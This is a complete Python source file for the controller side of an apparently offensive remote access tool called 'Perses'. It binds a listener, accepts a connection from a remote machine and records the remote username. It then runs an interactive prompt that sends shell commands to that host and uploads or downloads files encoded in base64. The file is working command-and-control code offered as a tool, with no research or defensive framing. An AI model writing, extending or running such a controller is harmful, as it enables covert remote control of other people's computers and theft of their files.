import socket
import json
import base64
from lib.terminal import rgb, clear, help_command, set_console_title, server_banner

class Server:
#=====================================================================#

    def __init__(self, ip, port):
        set_console_title("Perses | Server")

        # Setup socket server and bind ip + port
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((ip, port))
        server.listen(0)

        clear()
        print(rgb(105, 67, 171, "[+] Wait for a connection to establish"))
        self.connection, self.address = server.accept()
        clear()
        self.username = self.data_receive()
        print(rgb(105, 67, 171, f"[+] Incoming Connection: {rgb(255, 255, 255, f'[{str(self.username)}@{str(self.address[0])}:{str(self.address[1])}]')}\n"))
        set_console_title(f"Perses | Connected with: {self.username}@{self.address[0]}")

    #=====================================================================#

    def data_receive(self):
        jsonData = b""
        while True:
            try:
                jsonData += self.connection.recv(1024)
                return json.loads(jsonData)
            except ValueError:
                continue

    #=====================================================================#

    def data_send(self, data):
        jsonData = json.dumps(data)
        self.connection.send(jsonData.encode())

    #=====================================================================#

    def execute_remotely(self, command):
        self.data_send(command)
        if command[0] == "exit":
            self.connection.close()
            exit()
        return self.data_receive()

    #=====================================================================#

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    #=====================================================================#

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Download complete"

    #=====================================================================#

    def handle_result(self, result):
        if "[-]" in result:
            return rgb(171, 67, 70, result)
        elif "[+]" in result:
            return rgb(67, 171, 107, result)
        else:
            return rgb(255, 255, 255, result)

    #=====================================================================#
    
    def run(self):
        while True:
            command = input(rgb(105, 67, 171, f"┌── {rgb(255, 255, 255, '[')}{rgb(105, 67, 171, f'perses@{self.address[0]}')}{rgb(255, 255, 255, ']')}\n{rgb(105, 67, 171, f'└──────$')} "))
            command = command.split(" ", 1)
            try:
                if command[0] == "upload":
                    fileContent = self.read_file(command[1]).decode()
                    command.append(fileContent)

                result = self.execute_remotely(command)
                if command[0] == "download" and "[-] Error" not in result:
                    result = self.write_file(command[1], result)

                elif command[0] == "help":
                    help_command()

                elif command[0] == "clear":
                    clear()
            except Exception:
                result = "[-] Error running command, check the syntax of the command."
            print(self.handle_result(result))
